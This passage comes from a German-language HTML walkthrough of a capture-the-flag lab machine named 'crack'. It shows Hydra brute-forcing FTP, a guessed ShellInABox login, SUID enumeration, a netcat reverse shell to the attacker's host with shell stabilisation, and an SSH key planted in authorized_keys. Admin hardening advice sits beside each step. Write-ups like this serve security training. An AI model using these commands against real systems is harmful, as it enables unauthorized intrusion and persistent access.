+                2.  **Code-Fix:** Überarbeite das Python-Skript `crack.py` grundlegend, um die LFI-Schwachstelle zu schließen (keine direkte Verwendung von Benutzereingaben in Dateipfaden, Whitelisting, Eingabevalidierung).
+                3.  **Prinzip der geringsten Rechte:** Stelle sicher, dass Dienste nur mit den minimal erforderlichen Berechtigungen laufen.
+                4.  **Überprüfung:** Untersuche, ob durch diese Schwachstelle bereits sensible Daten kompromittiert wurden.</p>
+        </section>
+
+
+        <section id="initial-access"> <!-- Fortsetzung Initial Access -->
+            <p class="comment">Extrahieren von Benutzern mit Bash-Zugang aus der zuvor erlangten `/etc/passwd`-Datei.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Annahme: Ausgabe von /etc/passwd wurde in shit.txt gespeichert -->
+                     <pre>
+vi > shit.txt <!-- Befehl unklar, 'vi > file' ist keine Standard-Syntax. Annahme: Inhalt wurde manuell in vi kopiert und als shit.txt gespeichert. -->
+</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat shit.txt | tr " " "\n" | grep bash</span></div>
+                    <pre>
+['root:x:0:0:root:/root:/bin/bash\n',
+'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n',</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Inhalt der (vermutlich zuvor gespeicherten) `/etc/passwd`-Datei (`shit.txt`) wird mittels `cat` ausgegeben. Die Pipe `| tr " " "\n"` ersetzt Leerzeichen durch Newlines (was hier wenig Effekt hat, da die relevanten Teile nicht durch Leerzeichen getrennt sind, aber es schadet auch nicht). Die Ausgabe wird dann an `grep bash` weitergeleitet, welches nur die Zeilen filtert, die "bash" enthalten. Das Ergebnis identifiziert zwei Benutzer mit einer Bash-Shell: `root` und `cris`.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Extraktion potenzieller Benutzernamen für weitere Angriffsversuche (z.B. Brute-Force) aus den durch die LFI gewonnenen Daten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche, Zugangsdaten für den Benutzer `cris` zu finden oder zu erraten. Der Benutzer `root` ist meist schwerer direkt anzugreifen. Die ShellInABox-Schnittstelle (Port 4200) ist ein guter Kandidat für einen Login-Versuch.
+            <br>**Empfehlung (Admin):** Überwache fehlgeschlagene Login-Versuche. Verwende starke, einzigartige Passwörter für alle Benutzer.</p>
+
+            <p class="comment">Versuch eines Brute-Force-Angriffs auf den FTP-Account des Benutzers `cris` mittels Hydra.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l cris -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.116:21 -t 64</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these groups ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-20 16:34:21
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344402 login tries (l:1/p:14344402), ~224132 tries per task
+[DATA] attacking ftp://192.168.2.116:21/
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-20 16:34:55</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Hydra wird verwendet, um einen Passwort-Brute-Force-Angriff gegen den FTP-Dienst (`ftp://192.168.2.116:21`) durchzuführen. Es wird versucht, sich als Benutzer `cris` (`-l cris`) anzumelden, wobei Passwörter aus der bekannten Wortliste `rockyou.txt` (`-P /usr/share/wordlists/rockyou.txt`) verwendet werden. Der Angriff wird mit 64 parallelen Tasks (`-t 64`) durchgeführt. Hydra testet über 14 Millionen Passwörter, findet jedoch kein gültiges Passwort ("0 valid passwords found").</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Der FTP-Brute-Force-Versuch war erfolglos. Das Passwort für `cris` befindet sich nicht in der `rockyou.txt`-Liste oder der FTP-Login für diesen Benutzer ist nicht erlaubt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Probiere andere Angriffsvektoren für den Benutzer `cris`. Die ShellInABox-Schnittstelle auf Port 4200 ist der nächste logische Kandidat. Teste dort einfache oder häufig verwendete Passwörter.
+            <br>**Empfehlung (Admin):** Implementiere Intrusion-Detection/Prevention-Systeme (IDS/IPS), um Brute-Force-Angriffe zu erkennen und zu blockieren (z.B. fail2ban). Stelle sicher, dass FTP-Logins nur für benötigte Benutzer erlaubt sind und starke Passwörter verwendet werden.</p>
+
+            <p class="comment">Manueller Login-Versuch über die ShellInABox-Weboberfläche auf Port 4200.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Keine Shell-Ausgabe, sondern Darstellung der Interaktion im Browser/ShellInABox -->
+                    <pre>
+https://192.168.2.116:4200
+crack login:
+
+crack login: cris
+Password: <!-- Versuch 1 (Passwort nicht sichtbar) -->
+
+Login incorrect
+crack login: cris
+Password: <!-- Versuch 2 (Passwort nicht sichtbar) -->
+
+Login incorrect
+crack login: cris
+Password: <!-- Versuch 3 (Passwort: cris) -->
+
+<!-- Erfolgreicher Login -->
+Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun  7 14:39:38 CEST 2023 from 192.168.0.100 on pts/0
+
+<!-- Zusätzlicher Kommentar aus dem Originaltext -->
+username: cris
+password: <span class="password">cris</span>
+
+cris@crack:~$ <!-- Erfolgreich Shell als 'cris' erhalten -->
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Es wird eine Verbindung zur ShellInABox-Oberfläche unter `https://192.168.2.116:4200` hergestellt. Nach zwei fehlgeschlagenen Login-Versuchen für den Benutzer `cris` ist der dritte Versuch mit dem Passwort `<span class="password">cris</span>` erfolgreich. Der Angreifer erhält eine Shell als Benutzer `cris` auf dem Zielsystem.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Ein schwaches, leicht zu erratendes Passwort (Benutzername = Passwort) ermöglichte den initialen Zugriff auf das System als Benutzer `cris`. Dies ist ein häufiger Konfigurationsfehler.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Du hast nun initialen Zugriff! Beginne sofort mit der Enumeration des Systems aus der Sicht des Benutzers `cris`. Suche nach Möglichkeiten zur Privilegienerweiterung (Privilege Escalation). Der erste Schritt ist oft, die `sudo`-Rechte zu prüfen (`sudo -l`) und nach SUID/GUID-Binaries zu suchen (`find / -type f -perm -4000 -ls 2>/dev/null`).
+            <br>**Empfehlung (Admin):** **Dringend:** Ändere das Passwort für den Benutzer `cris` sofort in ein starkes, einzigartiges Passwort. Erzwinge Passwortrichtlinien (Mindestlänge, Komplexität, Ablaufdatum). Überprüfe alle Systembenutzer auf schwache Passwörter. Überwache Login-Aktivitäten auf verdächtiges Verhalten.</p>
+
+            <p class="comment">Auslesen der User-Flag aus der Datei `user.txt` im Home-Verzeichnis.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">eG4TUsTBxSFjTPHMV</span></pre> <!-- User Flag -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">cat user.txt | base64 -d</span></div>
+                     <pre>
+xnR!cL1base64: entrada inválida <!-- Fehler: Flag ist kein Base64 -->
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Nach dem erfolgreichen Login als `cris` wird der Inhalt der Datei `user.txt` im Home-Verzeichnis mit `cat user.txt` ausgelesen. Die Datei enthält die Zeichenkette `<span class="password">eG4TUsTBxSFjTPHMV</span>`, was die User-Flag darstellt. Ein anschließender Versuch, die Flag als Base64 zu dekodieren (`base64 -d`), scheitert, was zeigt, dass die Flag nicht Base64-kodiert ist.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiches Erreichen des ersten Ziels (User-Flag). Bestätigt den Zugriff auf das Home-Verzeichnis des Benutzers.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notiere die User-Flag. Setze die Enumeration zur Privilegienerweiterung fort.
+            <br>**Empfehlung (Admin):** Keine direkten Maßnahmen bezüglich der Flag selbst. Die Tatsache, dass sie gelesen werden konnte, unterstreicht die Notwendigkeit, den initialen Zugriff zu verhindern (siehe vorherige Empfehlung).</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+
+            <p class="comment">Suche nach Dateien mit gesetztem SUID-Bit, um potenzielle Privesc-Vektoren zu finden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   138823    472 -rwsr-xr-x   1 root     root       481608 jul  2  2022 /usr/lib/openssh/ssh-keysign
+   271304     52 -rwsr-xr--   1 root     messagebus    51336 oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   263174     44 -rwsr-xr-x   1 root     root          44632 feb  7  2020 /usr/bin/newgrp
+   276285    180 -rwsr-xr-x   1 root     root         182600 ene 14 14:29 /usr/bin/sudo <!-- Interessant, aber Standard -->
+   259679     88 -rwsr-xr-x   1 root     root          88304 feb  7  2020 /usr/bin/gpasswd
+   263700     56 -rwsr-xr-x   1 root     root          55528 ene 20  2022 /usr/bin/mount
+   259680     64 -rwsr-xr-x   1 root     root          63960 feb  7  2020 /usr/bin/passwd
+   259676     60 -rwsr-xr-x   1 root     root          58416 feb  7  2020 /usr/bin/chfn
+   263333     72 -rwsr-xr-x   1 root     root          71912 ene 20  2022 /usr/bin/su
+   263702     36 -rwsr-xr-x   1 root     root          35040 ene 20  2022 /usr/bin/umount
+   259677     52 -rwsr-xr-x   1 root     root          52880 feb  7  2020 /usr/bin/chsh</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` sucht im gesamten Dateisystem (`/`) nach Dateien (`-type f`), bei denen das SUID-Bit gesetzt ist (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, die Datei mit den Rechten des Dateieigentümers (hier meist `root`) auszuführen. Die Option `-ls` zeigt detaillierte Informationen an, und `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Leserechten). Die Ausgabe listet mehrere Standard-SUID-Binaries auf (`sudo`, `mount`, `passwd`, `su`, etc.). Es sind keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien sichtbar, die auf eine einfache Ausnutzung hindeuten.</p>
+            <p class="evaluation">**Bewertung:** Niedrig bis Mittel. Es wurden keine offensichtlich ausnutzbaren, nicht standardmäßigen SUID-Binaries gefunden. Die Anwesenheit von `sudo` ist jedoch immer ein potenzieller Vektor, der weiter untersucht werden muss (`sudo -l`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Prüfe als Nächstes die `sudo`-Berechtigungen mit `sudo -l`. Untersuche auch die Standard-SUID-Binaries auf bekannte Schwachstellen (GTFOBins), obwohl dies bei aktuellen Systemversionen weniger wahrscheinlich ist.
+            <br>**Empfehlung (Admin):** Überprüfe regelmäßig die SUID/GUID-Berechtigungen im System. Entferne das SUID-Bit von Binaries, wo es nicht zwingend benötigt wird. Halte das System und alle Pakete auf dem neuesten Stand, um bekannte Schwachstellen in SUID-Binaries zu vermeiden.</p>
+
+            <p class="comment">Überprüfung interessanter Verzeichnisse und Dateiberechtigungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">ls -la /var/backups/</span></div>
+                    <pre>
+total 16
+drwxr-xr-x  2 root root 4096 jun 20 15:00 .
+drwxr-xr-x 11 root root 4096 jun  7 12:11 ..
+-rw-r--r--  1 root root 6902 jun  7 12:20 apt.extended_states.0</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">ls -la /opt/</span></div>
+                     <pre>
+total 8
+drwxr-xr-x  2 root root 4096 jun  7 12:11 .
+drwxr-xr-x 18 root root 4096 jun  7 12:13 ..</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre><!-- Keine Ausgabe: Keine speziellen Capabilities gefunden --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>
+-rw-r--r-- 1 root root 1522 jun  7 12:20 /etc/passwd</pre> <!-- Normale Berechtigungen -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">uname -a</span></div>
+                     <pre>
+Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux</pre> <!-- Kernel-Information -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es werden verschiedene Befehle zur weiteren Systemenumeration ausgeführt:
+            *   `ls -la /var/backups/`: Zeigt eine Backup-Datei von `apt`. Keine offensichtlich nützlichen Backups gefunden.
+            *   `ls -la /opt/`: Das Verzeichnis `/opt` ist leer.
+            *   `getcap -r / 2>/dev/null`: Sucht nach Dateien mit speziellen Linux Capabilities, die zur Privilegienerweiterung missbraucht werden könnten. Keine gefunden.
+            *   `ls -la /etc/passwd`: Zeigt die Berechtigungen der Passwortdatei. Sie ist nur für Root beschreibbar, was normal ist.
+            *   `uname -a`: Gibt die Kernel-Version aus (Linux 5.10.0-23-amd64). Dies ist nützlich, um nach bekannten Kernel-Exploits zu suchen, obwohl diese oft schwerer auszunutzen sind.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Diese Enumerationsschritte haben keine direkten Privesc-Vektoren aufgedeckt. Die Kernel-Version ist relativ aktuell (Mai 2023), was die Wahrscheinlichkeit eines einfachen Kernel-Exploits verringert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussiere dich weiterhin auf Konfigurationsfehler. Der nächste logische Schritt ist die Überprüfung der `sudo`-Rechte.
+            <br>**Empfehlung (Admin):** Halte das System und den Kernel aktuell. Überprüfe regelmäßig Dateiberechtigungen und Konfigurationen.</p>
+
+            <p class="comment">Einrichten einer Reverse Shell vom Zielsystem zum Angreifer-System für eine stabilere Shell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>listening on [any] 5555 ...</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">nc -e /bin/bash 192.168.2.137 5555</span></div> <!-- Opfer-System -->
+                     <pre><!-- Keine Ausgabe auf Opferseite, Verbindung wird aufgebaut --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+listening on [any] 5555 ...
+connect to [192.168.2.137] from (UNKNOWN) [192.168.2.116] 52974 <!-- Erfolgreiche Verbindung -->
+<!-- Hier beginnt die Reverse Shell -->
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cris@crack:~$ <!-- Shell wird interaktiver --> ^[[200~export TERM=xterm^[[201~ <!-- Steuerzeichen bei Copy-Paste -->
+export TERM=xtexport TERM=xterm
+cris@crack:~$ ^[[200~export TERM=xterm^[[201~
+export TERM=xtexport TERM=xterm
+cris@crack:~$ ^[[200~export TERM=xterm^[[201~
+export TERM=xtexport TERM=xterm
+cris@crack:~$ export TERM=xterm <!-- Korrekte Eingabe -->
+export TERM=xterm
+cris@crack:~$ ^Z <!-- Shell in den Hintergrund legen (auf Angreiferseite) -->
+zsh: suspended  nc -lvnp 5555</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 5555
+                               reset <!-- Terminal zurücksetzen -->
+cris@crack:~$ <!-- Voll interaktive Shell -->
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es wird eine Reverse Shell aufgebaut:
+            1. Auf dem Angreifer-System (`root@cyber`) wird ein Netcat-Listener auf Port 5555 gestartet (`nc -lvnp 5555`).
+            2. Auf dem Zielsystem (`cris@crack`) wird Netcat verwendet, um eine Verbindung zum Angreifer auf Port 5555 herzustellen und bei Erfolg eine Bash-Shell (`/bin/bash`) zu starten und über die Verbindung zu leiten (`-e /bin/bash`). Hinweis: Die Option `-e` ist bei vielen modernen `nc`-Versionen aus Sicherheitsgründen entfernt worden; hier scheint sie verfügbar zu sein.
+            3. Die Verbindung wird erfolgreich hergestellt.
+            4. **Shell-Stabilisierung:**
+                * Mit `which python3` wird geprüft, ob Python 3 vorhanden ist.
+                * Mit `python3 -c 'import pty;pty.spawn("/bin/bash")'` wird eine interaktivere PTY-Shell erzeugt.
+                * Mit `export TERM=xterm` wird der Terminaltyp gesetzt, um Kompatibilität mit Tools wie `clear` oder Texteditoren zu verbessern. (Die vielen fehlerhaften Eingaben mit Steuerzeichen sind typisch für Copy&Paste in einfache Shells).
+                * Auf dem Angreifer-System wird die Shell mit Strg+Z (`^Z`) in den Hintergrund gelegt.
+                * Mit `stty raw -echo` werden die lokalen Terminaleinstellungen angepasst, um Steuerzeichen korrekt weiterzuleiten.
+                * Mit `fg` wird der Netcat-Prozess wieder in den Vordergrund geholt.
+                * `reset` kann optional verwendet werden, um die Terminalanzeige zu bereinigen.
+            Das Ergebnis ist eine voll funktionsfähige, interaktive Shell auf dem Zielsystem.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Etablierung einer stabilen Reverse Shell. Dies verbessert die Arbeitsumgebung für die weitere Enumeration und Ausnutzung erheblich im Vergleich zur ShellInABox-Weboberfläche.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze diese stabile Shell für die weiteren Schritte der Privilegienerweiterung.
+            <br>**Empfehlung (Admin):** Überwache ausgehende Netzwerkverbindungen. Implementiere Egress-Filterung, um Verbindungen zu ungewöhnlichen Ports zu blockieren. Entferne oder ersetze Netcat-Versionen mit der gefährlichen `-e`-Option, falls möglich. Härte das System, um die Ausführung unerwünschter Befehle zu verhindern.</p>
+
+            <p class="comment">Weitere Enumeration im Home-Verzeichnis von `cris` und Untersuchung laufender Prozesse.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 44
+drwxr-xr-x 3 cris cris 4096 jun  7 14:40 .
+drwxr-xr-x 3 root root 4096 jun  7 12:16 ..
+lrwxrwxrwx 1 cris cris    9 jun  7 12:19 .bash_history -> /dev/null <!-- History wird nicht gespeichert -->
+-rw-r--r-- 1 cris cris  220 jun  7 12:16 .bash_logout
+-rw-r--r-- 1 cris cris 3526 jun  7 12:16 .bashrc
+-rwxr-xr-x 1 cris cris  849 jun  7 14:39 crack.py <!-- Das bekannte Skript -->
+drwxr-xr-x 3 cris cris 4096 jun  7 12:19 .local
+-rw-r--r-- 1 cris cris  807 jun  7 12:16 .profile
+-rw-r--r-- 1 cris cris   66 jun  7 12:23 .selected_editor
+-rw------- 1 cris cris   19 jun  7 12:19 user.txt
+-rw------- 1 cris cris   51 jun  7 14:39 .Xauthority
+-rwxr-xr-x 1 cris cris  170 jun  7 14:40 ziempre.py <!-- Neue interessante Datei -->
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">cat ziempre.py</span></div>
+                     <!-- Maskierung von < und > nicht nötig, da kein HTML/XML -->
+                     <pre>
+#!/usr/local/lib/python3.7 <!-- Ungewöhnlicher Shebang-Pfad -->
+from subprocess import Popen
+import sys
+program = "/home/cris/crack.py"
+while True:
+    p = Popen("python3 "+program, shell=True)
+    p.wait()</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   Process
+LISTEN   0        50             0.0.0.0:12359          0.0.0.0:*       users:(("python3",pid=1000,fd=3)) <!-- crack.py Prozess -->
+LISTEN   0        128            0.0.0.0:4200           0.0.0.0:*       <!-- ShellInABox Prozess (PID nicht gezeigt) -->
+LISTEN   0        128          127.0.0.1:22             0.0.0.0:*       <!-- SSHD lauscht nur lokal -->
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            *   `ls -la`: Zeigt den Inhalt des Home-Verzeichnisses. Die `.bash_history` wird nach `/dev/null` gelinkt, d.h. es wird keine Befehlshistorie gespeichert. Die Datei `ziempre.py` fällt auf.
+            *   `cat ziempre.py`: Dieses Python-Skript startet das anfällige `crack.py`-Skript in einer Endlosschleife (`while True`). Immer wenn `crack.py` beendet wird (z.B. durch einen Fehler oder manuelles Beenden), startet `ziempre.py` es sofort neu. Der Shebang `#!/usr/local/lib/python3.7` ist ungewöhnlich; Standard wäre `/usr/bin/python3`.
+            *   `ss -altpn`: Zeigt lauschende TCP-Sockets. Bestätigt, dass ein `python3`-Prozess (PID 1000) auf Port 12359 lauscht (das ist `crack.py`, gestartet von `ziempre.py`). Es zeigt auch den Listener für ShellInABox auf Port 4200 und einen SSH-Daemon auf Port 22, der aber nur auf dem Loopback-Interface (127.0.0.1) lauscht und somit nicht von außen erreichbar ist.</p>
+            <p class="evaluation">**Bewertung:** Mittel. Die Entdeckung von `ziempre.py` erklärt, warum das LFI-Skript `crack.py` immer läuft. Es bietet aber auch einen potenziellen Angriffsvektor: Wenn der Benutzer `cris` die Datei `crack.py` ändern kann (was hier der Fall ist, da sie im Home-Verzeichnis liegt und `cris` gehört), könnte er bösartigen Code einschleusen, der dann von `ziempre.py` (welches vermutlich als `cris` läuft) ausgeführt wird. Dies ist jedoch keine direkte Privilegienerweiterung zu Root. Der nur lokal lauschende SSH-Dienst ist für den externen Zugriff irrelevant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Prüfe die `sudo`-Rechte (`sudo -l`). Das Modifizieren von `crack.py` ist zwar möglich, führt aber wahrscheinlich nicht zu Root-Rechten, es sei denn, `ziempre.py` läuft als anderer Benutzer (unwahrscheinlich).
+            <br>**Empfehlung (Admin):** Überprüfe den Zweck von `ziempre.py`. Wenn es benötigt wird, stelle sicher, dass es nicht einfach modifizierbare Skripte ausführt. Konfiguriere Dienste so, dass sie nicht unnötig neu gestartet werden. Stelle sicher, dass SSH nur lauscht, wenn es benötigt wird, und konfiguriere es sicher.</p>
+
+            <p class="comment">Vorbereiten des Einschleusens des eigenen SSH-Keys in die `authorized_keys` des Zielbenutzers (hier `cris`). Dieser Schritt ist eigentlich redundant, da bereits eine Shell als `cris` besteht, und zielt nicht auf Root ab.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">cat /root/.ssh/id_rsa.pub</span></div>
+                     <pre>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDq0ooG3pCddnCwsjFxHy8lYqE5DmQ37M8GN1voKjbqrTjkim7iVvFU5L7RnCHJgpXy2fHIe1HfvFp/9fy8ErE2cvxEnuayztCpszd1y7+c/vizXGbwufBTxPFnDv8x0pTXN87IZijYd1mJC199qsjrL7XQRH8IyydIXWBF4pCCpajyirgesWSA8u4HptRDlE3oay7bli7V0ftoQbZeVGp/39a2WNF//WrSjvaID/cbL33I8Lj/6z/XuUjCVroW+ZLaU2qD29Z9SyBoLuFcMVv987Jbdu0QljLHkKqNgF1KUyGBXpgkM4LF/1rlscTrGNJAe2XZ15Jryk/3fK7GA6f8PZC5T8BI6maYHlC26gvaZTfv6hLtwepM+PjeuiU0X2Yvf0BxkV8uGVkUdzEiv7/jUyzG5ApIwDEGY62+BJSu2fLUzj2e4U4wLbBndJ7RzE40hygBPRFULLuLs2EFkhClj4BHgHaLzoF/Q4J+MFrnGqUTeHLd6484HTH/c= root@cyber</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, Kommando wird auf Angreifer-System vorbereitet -->
+                    <pre><span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDq0ooG3pCddnCwsjFxHy8lYqE5DmQ37M8GN1voKjbqrTjkim7iVvFU5L7RnCHJgpXy2fHIe1HfvFp/9fy8ErE2cvxEnuayztCpszd1y7+c/vizXGbwufBTxPFnDv8x0pTXN87IZijYd1mJC199qsjrL7XQRH8IyydIXWBF4pCCpajyirgesWSA8u4HptRDlE3oay7bli7V0ftoQbZeVGp/39a2WNF//WrSjvaID/cbL33I8Lj/6z/XuUjCVroW+ZLaU2qD29Z9SyBoLuFcMVv987Jbdu0QljLHkKqNgF1KUyGBXpgkM4LF/1rlscTrGNJAe2XZ15Jryk/3fK7GA6f8PZC5T8BI6maYHlC26gvaZTfv6hLtwepM+PjeuiU0X2Yvf0BxkV8uGVkUdzEiv7/jUyzG5ApIwDEGY62+BJSu2fLUzj2e4U4wLbBndJ7RzE40hygBPRFULLuLs2EFkhClj4BHgHaLzoF/Q4J+MFrnGqUTeHLd6484HTH/c= root@cyber' > authorized_keys</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">mkdir .ssh</span></div> <!-- Auf Zielsystem als cris -->
+                     <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ls</span></div>
+                     <pre>crack.py  user.txt  ziempre.py</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ks .ka</span></div> <!-- Tippfehler, Befehl 'ks' existiert nicht -->
+                     <pre>bash: ks: orden no encontrada</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 48
+drwxr-xr-x 4 cris cris 4096 jun 20 17:06 .
+drwxr-xr-x 3 root root 4096 jun  7 12:16 ..
+lrwxrwxrwx 1 cris cris    9 jun  7 12:19 .bash_history -> /dev/null
+-rw-r--r-- 1 cris cris  220 jun  7 12:16 .bash_logout
+-rw-r--r-- 1 cris cris 3526 jun  7 12:16 .bashrc
+-rwxr-xr-x 1 cris cris  849 jun  7 14:39 crack.py
+drwxr-xr-x 3 cris cris 4096 jun  7 12:19 .local
+-rw-r--r-- 1 cris cris  807 jun  7 12:16 .profile
+-rw-r--r-- 1 cris cris   66 jun  7 12:23 .selected_editor
+drwxr-xr-x 2 cris cris 4096 jun 20 17:06 .ssh <!-- Verzeichnis erstellt -->
+-rw------- 1 cris cris   19 jun  7 12:19 user.txt
+-rw------- 1 cris cris   51 jun  7 14:39 .Xauthority
+-rwxr-xr-x 1 cris cris  170 jun  7 14:40 ziempre.py</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">cd .ssh/</span></div>
+                     <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~/.ssh$ <span class="command">ll</span></div> <!-- Alias nicht verfügbar in dieser Shell -->
+                     <pre>bash: ll: orden no encontrada</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~/.ssh$ <span class="command">echo 'echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDq0ooG3pCddnCwsjFxHy8lYqE5DmQ37M8GN1voKjbqrTjkim7iVvFU5L7RnCHJgpXy2fHIe1HfvFp/9fy8ErE2cvxEnuayztCpszd1y7+c/vizXGbwufBTxPFnDv8x0pTXN87IZijYd1mJC199qsjrL7XQRH8IyydIXWBF4pCCpajyirgesWSA8u4HptRDlE3oay7bli7V0ftoQbZeVGp/39a2WNF//WrSjvaID/cbL33I8Lj/6z/XuUjCVroW+ZLaU2qD29Z9SyBoLuFcMVv987Jbdu0QljLHkKqNgF1KUyGBXpgkM4LF/1rlscTrGNJAe2XZ15Jryk/3fK7GA6f8PZC5T8BI6maYHlC26gvaZTfv6hLtwepM+PjeuiU0X2Yvf0BxkV8uGVkUdzEiv7/jUyzG5ApIwDEGY62+BJSu2fLUzj2e4U4wLbBndJ7RzE40hygBPRFULLuLs2EFkhClj4BHgHaLzoF/Q4J+MFrnGqUTeHLd6484HTH/c= root@cyber' > authorized_keys</span></div> <!-- Fehler: Doppelter Echo -->
+                     <pre><!-- Datei authorized_keys wird mit "echo 'ssh-rsa ...'" erstellt, nicht mit dem Key selbst --></pre>
+                 </div>
+             </div>
